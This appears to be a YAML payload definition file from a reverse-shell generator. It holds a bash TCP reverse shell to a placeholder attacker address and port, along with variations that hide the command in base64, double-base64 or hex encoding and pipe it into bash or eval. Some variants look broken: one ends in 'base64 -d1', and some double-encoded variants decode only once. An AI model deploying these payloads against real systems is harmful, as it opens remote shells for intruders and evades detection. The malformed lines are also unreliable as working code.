---

payload: cmd
direction: reverse

payloads:
  bash:
    name: bash-shells
    desc: Shells created with bash command
    items:
      - name: tcp-reverse-sh
        desc: TCP reverse shell with sh command
        filters:
          os: ["bsd", "linux", "mac"]
          shells: ["bash"]
          commands: []
          obfuscator: []
          proto: tcp
        variables:
          - name: shell
            filters: {}
            values:
              - bash
              - /bin/bash
          - name: minus_i
            filters: {}
            values:
              - ""
              - " -i"
        payload: |-
          {VAR:shell}{VAR:minus_i}>&/dev/tcp/__ADDR__/__PORT__ 0>&1
        variations:
          # [1] bash -c base64
          - name: "bash -c base64"
            filters:
              commands: ["bash", "base64"]
              obfuscator: ["base64pad"]
            payload: bash -c "$(echo <FUN:0:base64pad>{PAYLOAD}</FUN:0:base64pad>|base64 -d)"
          - name: "bash -c base64"
            filters:
              commands: ["bash", "base64"]
              obfuscator: ["base64pad"]
            payload: bash -c "`echo <FUN:0:base64pad>{PAYLOAD}</FUN:0:base64pad>|base64 -d`"

          # [2] bash -c base64 base64
          - name: "bash -c base64"
            filters:
              commands: ["bash", "base64"]
              obfuscator: ["2xbase64pad"]
            payload: bash -c "$(echo <FUN:0:2xbase64pad>{PAYLOAD}</FUN:0:2xbase64pad>|base64 -d)"
          - name: "bash -c base64"
            filters:
              commands: ["bash", "base64"]
              obfuscator: ["2xbase64pad"]
            payload: bash -c "`echo <FUN:0:2xbase64pad>{PAYLOAD}</FUN:0:2xbase64pad>|base64 -d`"

          # [3] eval base64
          - name: "eval base64"
            filters:
              commands: ["eval", "base64"]
              obfuscator: ["base64pad"]
            payload: eval $(echo <FUN:0:base64pad>{PAYLOAD}</FUN:0:base64pad>|base64 -d)
          - name: "eval base64"
            filters:
              commands: ["eval", "base64"]
              obfuscator: ["base64pad"]
            payload: eval `echo <FUN:0:base64pad>{PAYLOAD}</FUN:0:base64pad>|base64 -d`

          # [4] eval base64 base64
          - name: "eval base64 base64"
            filters:
              commands: ["eval", "base64"]
              obfuscator: ["2xbase64pad"]
            payload: eval $(echo <FUN:0:2xbase64pad>{PAYLOAD}</FUN:0:2xbase64pad>|base64 -d|base64 -d)
          - name: "eval base64 base64"
            filters:
              commands: ["eval", "base64"]
              obfuscator: ["2xbase64pad"]
            payload: eval `echo <FUN:0:2xbase64pad>{PAYLOAD}</FUN:0:2xbase64pad>|base64 -d|base64 -d1`

          # [5] printf hex bash
          - name: "printf hex bash"
            filters:
              commands: ["printf", "bash"]
              obfuscator: ["hex"]
            payload: printf '<FUN:0:hex>{PAYLOAD}</FUN:0:hex>'|bash
          - name: "printf hex bash"
            filters:
              commands: ["printf", "bash"]
              obfuscator: ["hex"]
            payload: printf "<FUN:0:hex>{PAYLOAD}</FUN:0:hex>"|bash

          # [6] printf hex-escaped bash
          - name: "printf hex-escaped bash"
            filters:
              commands: ["printf", "bash"]
              obfuscator: ["hexesc"]
            payload: printf <FUN:0:hexesc>{PAYLOAD}</FUN:0:hexesc>|bash
